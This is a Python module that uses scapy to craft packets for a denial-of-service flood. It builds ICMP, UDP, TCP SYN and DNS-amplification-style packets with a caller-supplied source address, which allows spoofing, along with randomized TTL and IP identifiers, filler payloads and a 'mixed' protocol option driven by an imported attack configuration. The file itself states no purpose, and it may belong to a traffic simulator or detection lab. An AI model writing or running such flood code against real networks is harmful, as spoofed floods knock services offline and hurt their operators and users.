import random

from scapy.all import ICMP, IP, TCP, UDP, Raw  # type: ignore

try:
    from .attack_config import AMPLIFICATION_SOURCE_PORTS, ATTACK_PROTOCOLS, AttackConfig
except ImportError:
    from attack_config import AMPLIFICATION_SOURCE_PORTS, ATTACK_PROTOCOLS, AttackConfig


def choose_protocol(protocol: str) -> str:
    if protocol == "mixed":
        return random.choice(ATTACK_PROTOCOLS)
    return protocol


def build_packet(src_ip: str, dst_ip: str, protocol: str, config: AttackConfig):
    payload = Raw(b"A" * config.payload_size)
    ip_layer = IP(
        src=src_ip,
        dst=dst_ip,
        ttl=random.randint(config.ttl_min, config.ttl_max),
        id=random.randint(1, 65535),
    )

    builders = {
        "icmp": _build_icmp_packet,
        "udp": _build_udp_packet,
        "tcp_syn": _build_tcp_syn_packet,
        "dns_amp": _build_dns_amp_packet,
    }
    return builders[protocol](ip_layer, payload, config)


def _build_icmp_packet(ip_layer, payload, _config: AttackConfig):
    return ip_layer / ICMP() / payload


def _build_udp_packet(ip_layer, payload, config: AttackConfig):
    return (
        ip_layer
        / UDP(
            sport=random.randint(1024, 65535),
            dport=random.choice(config.udp_ports),
        )
        / payload
    )


def _build_tcp_syn_packet(ip_layer, payload, config: AttackConfig):
    return (
        ip_layer
        / TCP(
            sport=random.randint(1024, 65535),
            dport=random.choice(config.tcp_ports),
            flags="S",
        )
        / payload
    )


def _build_dns_amp_packet(ip_layer, payload, _config: AttackConfig):
    return (
        ip_layer
        / UDP(
            sport=random.choice(AMPLIFICATION_SOURCE_PORTS),
            dport=random.randint(1024, 65535),
        )
        / payload
    )
